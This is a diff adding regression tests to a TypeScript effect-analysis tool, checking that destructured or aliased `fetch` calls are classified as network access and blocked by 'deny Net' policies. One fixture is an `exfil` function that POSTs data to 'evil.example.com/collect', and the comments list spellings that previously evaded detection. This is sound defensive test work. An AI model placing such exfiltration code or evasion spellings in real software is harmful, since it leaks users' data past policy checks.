@@ -12174,6 +12174,112 @@ if (blk()) {
     + `export function pureAlias() { const g = helper; return g(1); }\n`, "--out", path.join(d, "r"));
   check("CONTROL: aliasing an ordinary pure function stays pure — the unwrap classifies what the alias RESOLVES TO, it does not charge aliasing",
         !eff(rep(), "pureAlias"), JSON.stringify((rep().functions || []).map((f) => f.fn)));
+
+  // ── ⟨R95⟩ THE SPELLINGS THE ALIAS UNWRAP CANNOT REACH, AND WHY THE ANSWER IS A DIFFERENT MECHANISM ─
+  //
+  // CARDINAL SIN, measured at 0b360d4 — i.e. after every fix above — and EXECUTED: all four forms were
+  // compiled and run against a localhost listener, which logged a request from every one of them.
+  //
+  //     const { fetch } = globalThis;   fetch(u)        const { fetch: f } = globalThis;  f(u)
+  //     const g = globalThis;           g.fetch(u)      const a = [fetch];                a[0](u)
+  //
+  //     const { fetch } = globalThis;
+  //     await fetch("https://evil.example.com/collect", { method: "POST", body: data });
+  //     deny Net / deny Unknown / deny Net Unknown / pure / deny Net in src / pure src
+  //         →  exit 0, `policy ✓`, 0 effectful functions, ALL SIX POLICY FORMS
+  //
+  // The unwrap above cannot reach these: it follows an IDENTIFIER binding to its initializer NODE, and
+  // a destructure has no identifier initializer to follow — `fetch` binds to a BindingElement, which
+  // lives in a project file, which is exactly what the shadow guard reads as "the project's own".
+  // Every arm above asks about the CALLEE. The defect is that the callee is the wrong thing to ask.
+  //
+  // `crypto` never had this hole, and THE DIFFERENCE IS THE MECHANISM, not the effect: its arms key on
+  // the RESOLVED DECLARATION (the es-lib `parent === "Crypto"` arm, κ's `web-globals/crypto` rule), so
+  // a destructured `crypto` still lands on `Crypto.randomUUID`. `resolvedIsHostFetch` converges `fetch`
+  // onto that, which is why ONE predicate closes all four spellings instead of a fifth patch closing
+  // one. The crypto row at the end is pinned for the same reason: it is the negative the shape was
+  // read off, so if it ever stops holding, the reasoning above stops holding with it.
+  {
+    fs.writeFileSync(path.join(d, "pol95"), "deny Net\n");
+    const sin95 = run(`export async function exfil(data: string): Promise<void> {\n`
+                    + `  const { fetch } = globalThis;\n`
+                    + `  await fetch("https://evil.example.com/collect", { method: "POST", body: data });\n}\n`,
+                      "--policy", path.join(d, "pol95"));
+    check("⟨R95⟩ THE DEFECT: `const { fetch } = globalThis; fetch(url)` is Net — `deny Net` FIRES (exit 1), never a green over a destructured exfiltration",
+          sin95.status === 1 && /exfil/.test(sin95.stdout + sin95.stderr), `status=${sin95.status}`);
+
+    run(`export async function destructured(u: string) { const { fetch } = globalThis; return await fetch(u); }\n`
+      + `export async function renamed(u: string) { const { fetch: f } = globalThis; return await f(u); }\n`
+      + `export async function viaGlobalObj(u: string) { const g = globalThis; return await g.fetch(u); }\n`
+      + `export async function viaArray(u: string) { const a = [fetch]; return await a[0](u); }\n`
+      + `export async function literalHost() { const { fetch } = globalThis; return await fetch("https://api.example.com/x"); }\n`,
+        "--out", path.join(d, "r"));
+    const r95 = rep();
+    for (const n of ["destructured", "renamed", "viaGlobalObj", "viaArray"])
+      check(`⟨R95⟩ \`${n}\` reaches the host fetch and is Net — every spelling resolves to the SAME declaration, so one predicate closes all of them`,
+            (eff(r95, n)?.inferred || []).includes("Net"), JSON.stringify(eff(r95, n)));
+    check("⟨R95⟩ …and a destructured fetch still captures its HOST literal, so the allowlist and masking gates see it exactly as a bare call's is seen",
+          (eff(r95, "literalHost")?.hosts || []).includes("api.example.com"), JSON.stringify(eff(r95, "literalHost")));
+    check("⟨R95⟩ …and one with a RUNTIME url fails closed with `incomplete: Net` — an invisible destination must not be certifiable by an allowlist",
+          (eff(r95, "destructured")?.incomplete || []).includes("Net"), JSON.stringify(eff(r95, "destructured")));
+
+    // CONTROL: a destructured NON-host callable gains nothing. Charging on the destructure itself would
+    // pass every row above and fabricate Net across every codebase that unpacks an object.
+    run(`const bag = { foo: (x: string) => x.length, fetch: (u: string) => u.length };\n`
+      + `export function nonHost(x: string) { const { foo } = bag; return foo(x); }\n`
+      + `export function localNamedFetch(u: string) { const { fetch } = bag; return fetch(u); }\n`,
+        "--out", path.join(d, "r"));
+    const rNH = rep();
+    check("⟨R95⟩ CONTROL: `const { foo } = someObject; foo()` gains nothing — the predicate keys on WHICH declaration the call reaches, never on the syntax it was reached through",
+          !eff(rNH, "nonHost"), JSON.stringify((rNH.functions || []).map((f) => [f.fn, f.inferred])));
+    check("⟨R95⟩ CONTROL: a project-local member NAMED `fetch`, destructured, fabricates nothing — the name is not the evidence",
+          !eff(rNH, "localNamedFetch"), JSON.stringify((rNH.functions || []).map((f) => [f.fn, f.inferred])));
+
+    // CONTROL, guard (2): a project's OWN `fetch` written with OVERLOAD SIGNATURES. This is the one
+    // shape where the resolved declaration is BODYLESS and in a project file at the same time — guard
+    // (1) passes it and only the project-file test rejects it. Measured: deleting that test charges
+    // Net here, so this row is what makes guard (2) tested rather than merely present.
+    run(`export function fetch(u: string): Promise<Response>;\n`
+      + `export function fetch(u: URL): Promise<Response>;\n`
+      + `export function fetch(u: unknown): Promise<Response> { return Promise.resolve(new Response(String(u))); }\n`
+      + `export async function usesOwnOverload(u: string) { return await fetch(u); }\n`,
+        "--out", path.join(d, "r"));
+    check("⟨R95⟩ CONTROL: a project's own `fetch` declared with OVERLOAD SIGNATURES fabricates nothing — a bodyless declaration in a project file is still the project's own",
+          !eff(rep(), "usesOwnOverload"), JSON.stringify((rep().functions || []).map((f) => [f.fn, f.inferred])));
+
+    // CONTROL, guard (3): a RELATIVE import whose types are a `.d.ts` the scan's file set does not
+    // contain — bodyless, non-project, `Promise<Response>`-shaped, so guards (1), (2) and (4) all pass
+    // it and only the specifier test rejects it. Measured: deleting that test charges Net here. Same
+    // rule and same words as the import arm — a relative specifier is the project's own module however
+    // the scan's shape happened to fall.
+    fs.writeFileSync(path.join(d, "vendorshim.d.ts"), `export declare function fetch(u: string): Promise<Response>;\n`);
+    fs.writeFileSync(path.join(d, "a.ts"),
+      `import { fetch as viaRel } from "./vendorshim.js";\n`
+      + `import * as shim from "./vendorshim.js";\n`
+      + `export async function relDts(u: string) { return await viaRel(u); }\n`
+      + `export async function relNamespace(u: string) { return await shim.fetch(u); }\n`
+      + `export async function realGlobal(u: string) { const { fetch } = globalThis; return await fetch(u); }\n`);
+    spawnSync("node", [path.join(HERE, "scan.mjs"), path.join(d, "a.ts"), "--out", path.join(d, "r")], { encoding: "utf8" });
+    const rRel = rep();
+    check("⟨R95⟩ CONTROL: a RELATIVE import of an ambient `fetch(u): Promise<Response>` fabricates nothing — the module specifier decides, not file-set membership",
+          !eff(rRel, "relDts"), JSON.stringify((rRel.functions || []).map((f) => [f.fn, f.inferred])));
+    // THE SIBLING SPELLING OF THE SAME GUARD — the one the first cut of it missed. A namespace import's
+    // callee is a PropertyAccess, so a guard reading `call.expression` skipped it entirely and
+    // `shim.fetch(u)` FABRICATED Net over the project's own shim while `viaRel(u)` one line up did not.
+    // Written because §A.2 says the fixture for the sibling you were not handed is the one that matters.
+    check("⟨R95⟩ CONTROL: …and through a NAMESPACE import of the same relative module — the guard reads the callee's HEAD identifier, so a PropertyAccess callee cannot walk around it",
+          !eff(rRel, "relNamespace"), JSON.stringify((rRel.functions || []).map((f) => [f.fn, f.inferred])));
+    check("⟨R95⟩ …while the real global in the same file is still Net — the control did not disable the rule",
+          (eff(rRel, "realGlobal")?.inferred || []).includes("Net"), JSON.stringify(eff(rRel, "realGlobal")));
+
+    run(`export function direct() { return crypto.randomUUID(); }\n`
+      + `export function destructuredCrypto() { const { crypto } = globalThis; return crypto.randomUUID(); }\n`,
+        "--out", path.join(d, "r"));
+    const rC = rep();
+    check("⟨R95⟩ `crypto.randomUUID()` is Rand BOTH bare and destructured — the declaration-keyed mechanism this fix converged onto, pinned because it is the evidence the fix shape was read off",
+          (eff(rC, "direct")?.inferred || []).includes("Rand") && (eff(rC, "destructuredCrypto")?.inferred || []).includes("Rand"),
+          JSON.stringify((rC.functions || []).map((f) => [f.fn, f.inferred])));
+  }
   fs.rmSync(d, { recursive: true, force: true });
 }
 
